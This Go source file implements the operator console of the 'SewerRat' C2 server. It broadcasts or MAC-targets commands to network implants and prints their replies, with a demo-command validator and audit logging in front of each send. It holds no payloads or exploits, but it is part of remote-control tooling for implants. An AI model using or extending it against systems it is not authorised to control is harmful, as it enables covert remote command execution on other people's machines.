package server

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"sewerrat/shared"
)

// CLIHandler manages the command-line interface for the server
type CLIHandler struct {
	broadcaster *CommandBroadcaster
	listener    *ResponseListener
	timeout     time.Duration
}

// NewCLIHandler creates a new CLI handler
func NewCLIHandler(broadcaster *CommandBroadcaster, listener *ResponseListener, timeout time.Duration) *CLIHandler {
	return &CLIHandler{
		broadcaster: broadcaster,
		listener:    listener,
		timeout:     timeout,
	}
}

// Start begins the command loop
func (ch *CLIHandler) Start() error {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println("\n[+] SewerRat C2 Server Active")
	fmt.Printf("[*] Interface: %s (%s)\n",
		ch.broadcaster.GetLocalInterface(),
		ch.broadcaster.GetSourceMAC())
	fmt.Printf("[*] Local IP: %s\n", ch.broadcaster.GetSourceIP())
	fmt.Println("\nUsage:")
	fmt.Println("  broadcast <command>     - Send command to all devices")
	fmt.Println("  send <mac> <command>    - Send command to specific MAC")
	fmt.Println("  help                    - Show help")
	fmt.Println("  exit                    - Exit server\n")

	for {
		fmt.Print("sewerrat> ")
		input, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		if err := ch.processCommand(input); err != nil {
			fmt.Printf("[!] Error: %v\n", err)
		}
	}

	return nil
}

// processCommand parses and executes CLI commands
func (ch *CLIHandler) processCommand(input string) error {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return nil
	}

	cmd := parts[0]

	switch cmd {
	case "help":
		ch.showHelp()
		return nil

	case "exit", "quit":
		fmt.Println("[*] Exiting...")
		os.Exit(0)
		return nil

	case "broadcast":
		if len(parts) < 2 {
			return fmt.Errorf("usage: broadcast <command>")
		}
		command := strings.Join(parts[1:], " ")
		return ch.handleBroadcast(command)

	case "send":
		if len(parts) < 3 {
			return fmt.Errorf("usage: send <mac> <command>")
		}
		mac := parts[1]
		command := strings.Join(parts[2:], " ")
		return ch.handleSend(mac, command)

	default:
		return fmt.Errorf("unknown command: %s", cmd)
	}
}

// handleBroadcast sends a command to all devices
func (ch *CLIHandler) handleBroadcast(command string) error {
	if err := shared.ValidateDemoCommand(command); err != nil {
		log.Printf("[AUDIT] blocked broadcast command: %s (%v)\n", shared.SummarizeForAudit(command, shared.AuditPreviewLimit), err)
		return err
	}
	if err := ch.broadcaster.BroadcastCommand(command); err != nil {
		return err
	}
	log.Printf("[AUDIT] operator broadcast command accepted: %s\n", shared.SummarizeForAudit(command, shared.AuditPreviewLimit))

	// Wait for response with timeout
	fmt.Printf("[*] Waiting for responses (timeout: %v)...\n", ch.timeout)

	deadline := time.Now().Add(ch.timeout)
	for {
		remaining := time.Until(deadline)
		if remaining <= 0 {
			break
		}

		select {
		case resp := <-ch.listener.GetResponseChannel():
			log.Printf("[AUDIT] response from %s at %s: %s\n", resp.SourceMAC, resp.Timestamp.UTC().Format(time.RFC3339), shared.SummarizeForAudit(resp.Data, shared.AuditPreviewLimit))
			fmt.Printf("[<<] %s: %s\n", resp.SourceMAC, resp.Data)
		case <-time.After(remaining):
			break
		}
	}

	return nil
}

// handleSend sends a command to a specific MAC
func (ch *CLIHandler) handleSend(mac string, command string) error {
	if err := shared.ValidateDemoCommand(command); err != nil {
		log.Printf("[AUDIT] blocked targeted command for %s: %s (%v)\n", mac, shared.SummarizeForAudit(command, shared.AuditPreviewLimit), err)
		return err
	}
	if err := ch.broadcaster.SendCommand(mac, command); err != nil {
		return err
	}
	log.Printf("[AUDIT] operator targeted command accepted for %s: %s\n", mac, shared.SummarizeForAudit(command, shared.AuditPreviewLimit))

	// Wait for response
	fmt.Printf("[*] Waiting for response from %s (timeout: %v)...\n", mac, ch.timeout)

	deadline := time.Now().Add(ch.timeout)
	for {
		remaining := time.Until(deadline)
		if remaining <= 0 {
			fmt.Println("[!] No response received (timeout)")
			break
		}

		select {
		case resp := <-ch.listener.GetResponseChannel():
			if resp.SourceMAC == mac || mac == "ff:ff:ff:ff:ff:ff" {
				log.Printf("[AUDIT] response from %s at %s: %s\n", resp.SourceMAC, resp.Timestamp.UTC().Format(time.RFC3339), shared.SummarizeForAudit(resp.Data, shared.AuditPreviewLimit))
				fmt.Printf("[<<] %s: %s\n", resp.SourceMAC, resp.Data)
			}
		case <-time.After(remaining):
			break
		}
	}

	return nil
}

// showHelp displays help information
func (ch *CLIHandler) showHelp() {
	fmt.Println("\nSewerRat C2 Server Command Reference:")
	fmt.Println("=====================================")
	fmt.Println("\nbroadcast <command>")
	fmt.Println("  Send command to all active implants on the network.")
	fmt.Println("  Example: broadcast whoami")
	fmt.Println("")
	fmt.Println("send <mac> <command>")
	fmt.Println("  Send command to a specific MAC address.")
	fmt.Println("  Example: send 00:11:22:33:44:55 whoami")
	fmt.Println("")
	fmt.Println("help")
	fmt.Println("  Display this help message.")
	fmt.Println("")
	fmt.Println("exit / quit")
	fmt.Println("  Exit the server.")
	fmt.Println("")
}
